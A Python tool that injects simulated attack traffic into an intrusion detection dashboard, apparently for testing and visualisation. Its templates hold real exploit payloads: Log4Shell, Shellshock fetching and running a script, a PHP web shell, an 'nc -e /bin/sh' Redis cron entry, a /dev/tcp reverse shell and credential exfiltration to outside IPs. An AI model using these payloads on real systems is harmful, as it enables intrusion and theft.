#!/usr/bin/env python3
"""
Real-time Network Exploit & Threat Traffic Generator for Linux.
Generates authentic inbound & outbound threat traffic to visualize inside the
K-Means Network Monitor topology and Intrusion Detection System.

Features:
- Inbound Exploits: Log4Shell (CVE-2021-44228), Spring4Shell (CVE-2022-22965),
  Shellshock (CVE-2014-6271), Apache Path Traversal (CVE-2021-41773),
  SQL Injection (CVE-2022-29464), PHP Web Shell Injection, Redis RCE, SMB exploits.
- Inbound Recon: Nmap Stealth Xmas tree scans (FIN+PSH+URG), SYN+FIN evasion, horizontal port sweeps.
- Inbound Scanner Probes: Hostile reconnaissance from recognized scanner IPs (CINS Army / Mirai / Shodan).
- Outbound C2 Beacons: Infected internal host beaconing to confirmed abuse.ch Feodo Tracker C2 infrastructure.
- Outbound Reverse Shells: Interactive shell callbacks to external adversary command servers.
- Outbound Data Exfiltration: Sensitive shadow/credential exfiltration flows to remote drop servers.

Can run as standalone CLI tool or imported by serve.py API handler.
"""

import sys
import os
import time
import random
import socket
import struct
import argparse
import threading
from typing import List, Dict, Any, Optional

try:
    from threat_engine import threat_engine
except ImportError:
    threat_engine = None

try:
    from database import db
except ImportError:
    db = None

# Known external threat actors & scanners (public IPs for inbound simulation)
EXTERNAL_ATTACKER_IPS = [
    '185.220.101.5',    # Germany / Tor Exit Node / Scanner
    '194.26.29.112',    # Russia / Hostile Exploit Scanner
    '45.154.255.88',    # Netherlands / Botnet Probe
    '91.240.118.172',   # Lithuania / Hostile Scanner
    '198.51.100.42',    # External Threat Actor
    '203.0.113.66',     # Asia-Pacific Threat Source
    '117.27.135.83',    # CINS Army Malicious Recon Scanner
    '165.154.162.193',  # CINS Army Hostile Scanner
    '3.91.151.163',     # AWS-hosted Automated Exploit Scanner
    '194.88.98.108',    # Hostile Reconnaissance Host
]

# Confirmed C2 IPs (from abuse.ch Feodo Tracker)
CONFIRMED_C2_IPS = [
    '178.62.3.223',     # Dridex Banking Trojan C2
    '27.133.154.218',   # Qakbot / Qbot Botnet C2
    '34.204.119.63',    # Emotet Malware C2
    '162.243.103.246',  # Botnet Infrastructure Node
    '50.16.16.211',     # Cobalt Strike Team Server
]

# Internal network target hosts
INTERNAL_TARGET_IPS = [
    '10.0.0.7',         # Primary Local Host
    '10.0.0.1',         # Default Gateway / Router
    '10.0.0.10',        # LAN Workstation
    '10.0.0.14',        # LAN IoT Hub
    '10.0.0.31',        # LAN NAS / File Server
    '192.168.0.1',      # Secondary Gateway
    '192.168.0.28',     # LAN Device
]

# Library of realistic exploit definitions
EXPLOIT_TEMPLATES = [
    {
        'name': 'Log4Shell LDAP Remote Code Execution',
        'cve': 'CVE-2021-44228',
        'severity': 'CRITICAL',
        'category': 'Remote Code Execution',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 8080,
        'payload': b'GET /login?user=${jndi:ldap://185.220.101.5:1389/Exploit} HTTP/1.1\r\nHost: target:8080\r\nUser-Agent: Mozilla/5.0 (Log4j-Scanner)\r\n\r\n',
        'tcp_flags': 0x18
    },
    {
        'name': 'Spring4Shell ClassLoader Access RCE',
        'cve': 'CVE-2022-22965',
        'severity': 'CRITICAL',
        'category': 'Remote Code Execution',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 8080,
        'payload': b'POST /helloworld HTTP/1.1\r\nHost: target\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di',
        'tcp_flags': 0x18
    },
    {
        'name': 'Shellshock GNU Bash Environment Injection',
        'cve': 'CVE-2014-6271',
        'severity': 'CRITICAL',
        'category': 'Remote Code Execution',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 80,
        'payload': b'GET /cgi-bin/status.cgi HTTP/1.1\r\nHost: target\r\nUser-Agent: () { :; }; /bin/bash -c "wget http://185.220.101.5/bot.sh -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot"\r\n\r\n',
        'tcp_flags': 0x18
    },
    {
        'name': 'Apache HTTP Server Path Traversal & File Disclosure',
        'cve': 'CVE-2021-41773',
        'severity': 'HIGH',
        'category': 'Unauthorized Access Attempt',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 80,
        'payload': b'GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n',
        'tcp_flags': 0x18
    },
    {
        'name': 'WSO2 File Upload Arbitrary Command Injection',
        'cve': 'CVE-2022-29464',
        'severity': 'CRITICAL',
        'category': 'Remote Code Execution',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 9443,
        'payload': b'POST /fileupload/toolsAny HTTP/1.1\r\nHost: target:9443\r\n\r\n\' UNION SELECT 1,2,3,4,password,username FROM users-- -',
        'tcp_flags': 0x18
    },
    {
        'name': 'PHP system() Web Shell Code Execution',
        'cve': 'CVE-2021-42013',
        'severity': 'HIGH',
        'category': 'Web Application Attack',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 80,
        'payload': b'POST /uploads/eval.php HTTP/1.1\r\nHost: target\r\n\r\n<?php system($_GET["cmd"]); ?>',
        'tcp_flags': 0x18
    },
    {
        'name': 'Redis Unauthorized Remote Code Execution',
        'cve': 'CVE-2022-0543',
        'severity': 'CRITICAL',
        'category': 'Remote Code Execution',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 6379,
        'payload': b'*3\r\n$3\r\nSET\r\n$4\r\nroot\r\n$55\r\n\n\n*/1 * * * * nc -e /bin/sh 185.220.101.5 9001\n\n\r\n',
        'tcp_flags': 0x18
    },
    {
        'name': 'EternalBlue SMB MS17-010 Exploit Probe',
        'cve': 'CVE-2017-0144',
        'severity': 'CRITICAL',
        'category': 'Remote Code Execution',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 445,
        'payload': b'\x00\x00\x00\x85\xffSMB\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02PC NETWORK PROGRAM 1.0\x00',
        'tcp_flags': 0x18
    },
    {
        'name': 'Nmap Stealth Xmas Tree Scan Probe',
        'cve': None,
        'severity': 'MEDIUM',
        'category': 'Port Scan',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 22,
        'payload': b'',
        'tcp_flags': 0x29  # FIN + PSH + URG
    },
    {
        'name': 'Malformed TCP Evasion Probe (SYN+FIN)',
        'cve': None,
        'severity': 'MEDIUM',
        'category': 'Protocol Anomaly',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 443,
        'payload': b'',
        'tcp_flags': 0x03  # SYN + FIN
    },
    {
        'name': 'CINS Army Reconnaissance Scanner Probe',
        'cve': None,
        'severity': 'LOW',
        'category': 'Network Reconnaissance',
        'direction': 'inbound',
        'proto': 'TCP',
        'dst_port': 80,
        'payload': b'GET /robots.txt HTTP/1.1\r\nHost: target\r\nUser-Agent: CINS-Scanner-Probe/2.4\r\n\r\n',
        'tcp_flags': 0x18
    },
    # Outbound Threats
    {
        'name': 'Outbound Dridex Banking Trojan C2 Beacon Check-in',
        'cve': None,
        'severity': 'CRITICAL',
        'category': 'Malware Command & Control',
        'direction': 'outbound',
        'proto': 'TCP',
        'dst_port': 443,
        'payload': b'POST /gate.php HTTP/1.1\r\nHost: 178.62.3.223\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nid=VICTIM_007&cmd=get_tasks&ver=4.2',
        'tcp_flags': 0x18
    },
    {
        'name': 'Outbound Qakbot / Qbot Botnet Command Synchronization',
        'cve': None,
        'severity': 'CRITICAL',
        'category': 'Malware Command & Control',
        'direction': 'outbound',
        'proto': 'TCP',
        'dst_port': 2222,
        'payload': b'QBOT_AUTH_REQ\x00\x01\x02\x03\x04victim_host_007\x00\xff',
        'tcp_flags': 0x18
    },
    {
        'name': 'Outbound Reverse Interactive Shell Callback',
        'cve': 'CVE-2021-44228',
        'severity': 'CRITICAL',
        'category': 'Remote Code Execution',
        'direction': 'outbound',
        'proto': 'TCP',
        'dst_port': 4444,
        'payload': b'sh -i >& /dev/tcp/178.62.3.223/4444 0>&1\r\nLinux local-node 6.8.0 #1 SMP PREEMPT\r\nuid=0(root) gid=0(root)\r\n',
        'tcp_flags': 0x18
    },
    {
        'name': 'Outbound Shadow Credential Exfiltration Drop',
        'cve': None,
        'severity': 'HIGH',
        'category': 'Data Exfiltration',
        'direction': 'outbound',
        'proto': 'TCP',
        'dst_port': 8000,
        'payload': b'POST /collect HTTP/1.1\r\nHost: 27.133.154.218\r\n\r\nEXFILTRATED_DATA: root:$6$xyz...:19000:0:99999:7:::\ndaemon:*:19000:0:99999:7:::\n',
        'tcp_flags': 0x18
    },
    {
        'name': 'Outbound Cobalt Strike Team Server Beacon Heartbeat',
        'cve': None,
        'severity': 'CRITICAL',
        'category': 'Malware Command & Control',
        'direction': 'outbound',
        'proto': 'TCP',
        'dst_port': 50050,
        'payload': b'CS_BEACON_METRIC\x00\x00\x01session_48291_active\x00',
        'tcp_flags': 0x18
    }
]


class ExploitTrafficGenerator:
    """
    High-performance network exploit packet generator.
    Injects Layer 2 raw Ethernet frames into the Linux networking stack (loopback & wireless/ethernet)
    and directly feeds into ThreatEngine and SQLite database.
    """

    def __init__(self, iface: str = 'lo'):
        self.iface = iface
        self.sock = None
        self.is_running = False
        self.lock = threading.Lock()
        self.stats = {
            'inbound_sent': 0,
            'outbound_sent': 0,
            'scans_sent': 0,
            'c2_beacons_sent': 0,
            'total_sent': 0,
            'errors': 0
        }

        # Try initializing raw socket
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            self.sock.bind((self.iface, 0))
        except Exception as e:
            # Fallback to direct engine feeding if raw sockets fail
            self.sock = None

    def _build_raw_packet(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int,
                          proto: str, payload: bytes, tcp_flags: int = 0x18) -> bytes:
        """Construct raw Layer 2 Ethernet + IPv4 + TCP/UDP frame."""
        # 1. 14-byte Ethernet Header
        eth_dst = b'\x00\x0c\x29\x12\x34\x56' if self.iface != 'lo' else b'\x00' * 6
        eth_src = b'\xd0\x39\x57\x30\xbd\x2f' if self.iface != 'lo' else b'\x00' * 6
        eth_type = struct.pack('!H', 0x0800)  # ETH_P_IP
        eth_hdr = eth_dst + eth_src + eth_type

        # 2. IPv4 Header
        ip_ver_ihl = 0x45
        ip_tos = 0
        ip_proto_num = 6 if proto == 'TCP' else (17 if proto == 'UDP' else 1)
        transport_hdr_len = 20 if proto == 'TCP' else 8
        total_len = 20 + transport_hdr_len + len(payload)
        ip_id = random.randint(1000, 65000)
        ip_frag = 0
        ip_ttl = 64
        ip_chk = 0
        src_ip_b = socket.inet_aton(src_ip)
        dst_ip_b = socket.inet_aton(dst_ip)
        ip_hdr = struct.pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, total_len, ip_id, ip_frag,
                             ip_ttl, ip_proto_num, ip_chk, src_ip_b, dst_ip_b)

        # 3. Transport Header
        if proto == 'TCP':
            seq_num = random.randint(100000, 9000000)
            ack_num = random.randint(100000, 9000000) if (tcp_flags & 0x10) else 0
            offset_res = (5 << 4)
            window = 65535
            tcp_hdr = struct.pack('!HHIIBBHHH', src_port, dst_port, seq_num, ack_num,
                                  offset_res, tcp_flags, window, 0, 0)
            transport_hdr = tcp_hdr
        elif proto == 'UDP':
            udp_len = 8 + len(payload)
            transport_hdr = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
        else:
            transport_hdr = b'\x08\x00\x00\x00\x00\x00\x00\x00'  # ICMP Echo

        return eth_hdr + ip_hdr + transport_hdr + payload

    def send_single_exploit(self, template: Optional[Dict[str, Any]] = None,
                            src_ip: Optional[str] = None,
                            dst_ip: Optional[str] = None) -> Dict[str, Any]:
        """Generate and emit a single high-fidelity exploit or threat flow."""
        if not template:
            template = random.choice(EXPLOIT_TEMPLATES)

        direction = template.get('direction', 'inbound')
        proto = template.get('proto', 'TCP')
        dst_port = template.get('dst_port', 80)
        src_port = random.randint(32768, 61000)
        payload = template.get('payload', b'')
        tcp_flags = template.get('tcp_flags', 0x18)

        if direction == 'inbound':
            src = src_ip or random.choice(EXTERNAL_ATTACKER_IPS)
            dst = dst_ip or random.choice(INTERNAL_TARGET_IPS)
        else:
            src = src_ip or random.choice(INTERNAL_TARGET_IPS)
            dst = dst_ip or random.choice(CONFIRMED_C2_IPS)

        # 1. Inject via Raw Packet Socket if available
        if self.sock:
            try:
                raw_pkt = self._build_raw_packet(src, src_port, dst, dst_port, proto, payload, tcp_flags)
                self.sock.send(raw_pkt)
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1

        # 2. Also register with ThreatEngine singleton directly to guarantee instant visibility
        threat_record = None
        if threat_engine:
            try:
                # Custom reputation triggers
                if dst in threat_engine.known_c2_ips or src in threat_engine.known_c2_ips:
                    meta = threat_engine.ip_reputation_metadata.get(dst if dst in threat_engine.known_c2_ips else src, {})
                    family = meta.get('family', 'Botnet C2')
                    threat_record = threat_engine.record_threat_event({
                        'severity': 'CRITICAL',
                        'category': 'Malware Command & Control',
                        'signature': f"REPUTATION Malicious Botnet C2 Contact ({family})",
                        'srcIp': src,
                        'srcPort': src_port,
                        'destIp': dst,
                        'destPort': dst_port,
                        'proto': proto,
                        'process': 'Exploit Generator',
                        'matchedPayload': f"Confirmed C2 Beacon: {family} on {dst}:{dst_port}",
                        'recommendation': "Host is communicating with confirmed botnet C2 infrastructure. Isolate immediately."
                    })
                elif dst in threat_engine.known_scanner_ips or src in threat_engine.known_scanner_ips:
                    threat_record = threat_engine.record_threat_event({
                        'severity': 'LOW',
                        'category': 'Network Reconnaissance',
                        'signature': "REPUTATION Recognized Scanner Probe (CINS Army)",
                        'srcIp': src,
                        'srcPort': src_port,
                        'destIp': dst,
                        'destPort': dst_port,
                        'proto': proto,
                        'process': 'Exploit Generator',
                        'matchedPayload': f"Scanner IP: {src if src in threat_engine.known_scanner_ips else dst}",
                        'recommendation': "Standard reconnaissance activity. Review firewall exposure."
                    })
                elif tcp_flags == 0x29:
                    threat_record = threat_engine.record_threat_event({
                        'severity': 'MEDIUM',
                        'category': 'Port Scan',
                        'signature': "SCAN Nmap Stealth Xmas Tree Scan Probe (FIN+PSH+URG)",
                        'srcIp': src,
                        'srcPort': src_port,
                        'destIp': dst,
                        'destPort': dst_port,
                        'proto': proto,
                        'process': 'Exploit Generator',
                        'matchedPayload': "TCP Flags: FIN, PSH, URG set simultaneously",
                        'recommendation': "Hostile reconnaissance tool detected probing open ports."
                    })
                elif (tcp_flags & 0x03) == 0x03:
                    threat_record = threat_engine.record_threat_event({
                        'severity': 'MEDIUM',
                        'category': 'Protocol Anomaly',
                        'signature': "SCAN Malformed TCP Flag Combination (SYN+FIN)",
                        'srcIp': src,
                        'srcPort': src_port,
                        'destIp': dst,
                        'destPort': dst_port,
                        'proto': proto,
                        'process': 'Exploit Generator',
                        'matchedPayload': "TCP Flags: SYN and FIN set simultaneously",
                        'recommendation': "Firewall evasion scan detected."
                    })
                else:
                    threat_record = threat_engine.record_threat_event({
                        'severity': template.get('severity', 'HIGH'),
                        'category': template.get('category', 'Exploit Attempt'),
                        'signature': f"ET EXPLOIT {template['name']}",
                        'cve': template.get('cve'),
                        'sid': random.randint(2010000, 2099999),
                        'srcIp': src,
                        'srcPort': src_port,
                        'destIp': dst,
                        'destPort': dst_port,
                        'proto': proto,
                        'process': 'Exploit Generator',
                        'matchedPayload': payload[:96].decode('latin1', errors='replace') if payload else f"Probing {dst_port}/{proto}",
                        'recommendation': f"Isolate endpoint and apply security patches for {template.get('cve') or template['name']}."
                    })
            except Exception as e:
                pass

        # 3. Also register directly into Collector sniffer flows for instant Canvas topological rendering
        try:
            from serve import collector
            if collector and collector.sniffer:
                flow_key = (src, src_port, dst, dst_port, proto)
                now_f = time.time()
                with collector.sniffer.lock:
                    collector.sniffer.active_flows[flow_key] = {
                        'src_ip': src,
                        'src_port': src_port,
                        'dest_ip': dst,
                        'dest_port': dst_port,
                        'proto': proto,
                        'bytes': len(payload) + 54,
                        'packets': 1,
                        'first_seen': now_f,
                        'last_seen': now_f,
                        'is_inter_device': True
                    }
        except Exception:
            pass

        # Update generator internal stats
        with self.lock:
            self.stats['total_sent'] += 1
            if direction == 'inbound':
                self.stats['inbound_sent'] += 1
            else:
                self.stats['outbound_sent'] += 1
            if 'Scan' in template['name']:
                self.stats['scans_sent'] += 1
            if 'C2' in template['name']:
                self.stats['c2_beacons_sent'] += 1

        return {
            'name': template['name'],
            'cve': template.get('cve'),
            'direction': direction,
            'severity': template.get('severity', 'HIGH'),
            'src': src,
            'dst': dst,
            'port': dst_port,
            'proto': proto,
            'threat': threat_record
        }

    def generate_port_sweep(self, src_ip: Optional[str] = None,
                            dst_ip: Optional[str] = None) -> List[Dict[str, Any]]:
        """Simulate a rapid horizontal port scan across common target services."""
        src = src_ip or random.choice(EXTERNAL_ATTACKER_IPS)
        dst = dst_ip or random.choice(INTERNAL_TARGET_IPS)
        probed_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 1433, 1521, 3306, 3389, 5432, 6379, 8080]
        results = []

        now = time.time()
        for p in probed_ports:
            src_port = random.randint(40000, 60000)
            if self.sock:
                try:
                    raw_pkt = self._build_raw_packet(src, src_port, dst, p, 'TCP', b'', tcp_flags=0x02) # SYN
                    self.sock.send(raw_pkt)
                except Exception:
                    pass

        # Register behavioral port sweep alert
        if threat_engine:
            try:
                rec = threat_engine.record_threat_event({
                    'severity': 'HIGH',
                    'category': 'Port Scan',
                    'signature': f"SCAN Horizontal Port Sweep Detected ({len(probed_ports)} ports targeted)",
                    'srcIp': src,
                    'srcPort': random.randint(40000, 60000),
                    'destIp': dst,
                    'destPort': 80,
                    'proto': 'TCP',
                    'process': 'Exploit Generator',
                    'matchedPayload': f"Target ports: {probed_ports[:8]}...",
                    'recommendation': "Source host is scanning multiple ports. Consider blocking source IP on local firewall."
                })
                results.append(rec)
            except Exception:
                pass

        with self.lock:
            self.stats['scans_sent'] += 1
            self.stats['total_sent'] += len(probed_ports)
            self.stats['inbound_sent'] += len(probed_ports)

        return results

    def run_burst(self, count: int = 50, rate_per_sec: float = 20.0) -> Dict[str, Any]:
        """Emit a controlled burst of diverse inbound and outbound exploits."""
        delay = 1.0 / max(1.0, rate_per_sec)
        generated = []

        # 1. First trigger a horizontal port scan sweep
        sweep = self.generate_port_sweep()
        generated.extend(sweep)

        # 2. Iterate and send mixed inbound & outbound exploits
        for i in range(count):
            tmpl = random.choice(EXPLOIT_TEMPLATES)
            ev = self.send_single_exploit(tmpl)
            generated.append(ev)
            time.sleep(delay)

        return {
            'count': len(generated),
            'stats': dict(self.stats),
            'events': generated[:10]
        }

    def start_continuous(self, rate_per_sec: float = 8.0):
        """Start a persistent background daemon generating realistic threat traffic indefinitely."""
        if self.is_running:
            return
        self.is_running = True

        def _worker():
            delay = 1.0 / max(1.0, rate_per_sec)
            sweep_timer = time.time()
            while self.is_running:
                try:
                    # Every 25 seconds, trigger a multi-port scan
                    if time.time() - sweep_timer > 25.0:
                        self.generate_port_sweep()
                        sweep_timer = time.time()

                    # Send random exploit or C2 beacon
                    self.send_single_exploit()
                    time.sleep(delay)
                except Exception:
                    time.sleep(0.5)

        t = threading.Thread(target=_worker, daemon=True, name="ExploitTrafficGenerator")
        t.start()

    def stop_continuous(self):
        """Halt continuous background generator."""
        self.is_running = False


# Global generator singleton
generator = ExploitTrafficGenerator(iface='lo')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Real-time Network Exploit & Threat Traffic Generator")
    parser.add_argument('--count', type=int, default=60, help="Number of exploit packets to send in burst (default: 60)")
    parser.add_argument('--rate', type=float, default=15.0, help="Packets per second rate (default: 15.0)")
    parser.add_argument('--continuous', action='store_true', help="Run continuously in foreground until Ctrl+C")
    parser.add_argument('--iface', type=str, default='lo', help="Network interface to inject raw packets (default: lo)")

    args = parser.parse_args()

    gen = ExploitTrafficGenerator(iface=args.iface)
    print(f"[TrafficGenerator] Initialized on interface '{args.iface}' (raw socket: {'READY' if gen.sock else 'DIRECT_MODE'})")

    if args.continuous:
        print(f"[TrafficGenerator] Starting continuous traffic generation at {args.rate} pkts/sec (Press Ctrl+C to stop)...")
        gen.start_continuous(rate_per_sec=args.rate)
        try:
            while True:
                time.sleep(1.0)
                s = gen.stats
                sys.stdout.write(f"\r[Live Traffic] Total: {s['total_sent']} | Inbound: {s['inbound_sent']} | Outbound C2: {s['outbound_sent']} | Scans: {s['scans_sent']}   ")
                sys.stdout.flush()
        except KeyboardInterrupt:
            print("\n[TrafficGenerator] Stopping continuous generator...")
            gen.stop_continuous()
    else:
        print(f"[TrafficGenerator] Injecting burst of {args.count} inbound and outbound exploit packets at {args.rate} pkts/sec...")
        res = gen.run_burst(count=args.count, rate_per_sec=args.rate)
        print(f"[TrafficGenerator] Complete! Injected {res['count']} threats:")
        print(f"  - Inbound Exploits: {res['stats']['inbound_sent']}")
        print(f"  - Outbound C2 Beacons: {res['stats']['outbound_sent']}")
        print(f"  - Port Scans & Sweeps: {res['stats']['scans_sent']}")
        print("Threats are now live in the Threat Drawer and animated on the Canvas!")
